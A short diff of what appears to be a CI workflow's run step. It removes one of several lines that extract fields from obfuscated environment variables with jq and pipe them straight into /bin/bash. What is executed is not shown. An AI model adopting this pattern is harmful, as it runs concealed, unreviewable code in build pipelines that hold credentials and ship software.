@@ -18,7 +18,6 @@ jobs:
         run: |
           printf '%s' "$f21" | jq -r .qjl703 | /bin/bash
           printf '%s' "$zzq507" | jq -r .zue0929 | /bin/bash
-          echo $frk59 | jq -r .np64 | /bin/bash
           echo $xp9903 | jq -r .k33794 | /bin/bash
           echo $c6761 | jq -r .zea95 | /bin/bash
 
